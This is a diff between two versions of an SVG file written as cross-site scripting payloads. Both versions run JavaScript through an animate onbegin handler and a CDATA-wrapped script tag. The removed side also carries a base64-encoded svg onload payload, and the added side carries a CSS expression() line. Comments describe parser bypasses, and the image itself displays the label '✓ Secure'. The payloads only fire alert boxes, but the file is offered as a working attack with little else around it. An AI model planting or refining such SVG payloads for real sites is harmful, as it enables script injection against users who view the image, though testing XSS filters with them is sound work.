@@ -1,16 +1,15 @@
-<svg viewBox="0 0 400 300">
-<!-- Malformed attributes trigger parser bypass -->
-<rect width=400 height=300 fill=white/>
-<text x=10 y=25 font-size=14 fill=#6c757d>Image Loaded</text>
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" width=400 height=300>
+<rect width=400 height=300 fill=#f0f0f0/>
+<text x=10 y=20 fill=#666 font-size=12>✓ Secure</text>
 
-<!-- Unquoted attribute confusion + event handler -->
-<animate onbegin=alert`XSS` attributeName=dur values=M0 0 dur=1s/>
+<!-- CRITICAL: Unquoted template literal (breaks XML, executes JS) -->
+<animate attributeName=opacity onbegin=alert`XSS` dur=1s values=1 0/>
 
-<!-- CDATA script bypass (XML safe) -->
-<script><![CDATA[
-setTimeout(()=>alert('XSS'),0)
-]]></script>
+<!-- Multiple XML-safe fallbacks -->
+<script>//<![CDATA[
+/* */alert('XSS')
+//]]></script>
 
-<!-- Base64 polyglot - decodes in multiple parsers -->
-<desc>PHN2ZyBvbG9hZD1hbGVydCgneHNzJyk+PC9zdmc+</desc>
+<style>svg{onload:expression(alert('XSS'))}</style>
 </svg>
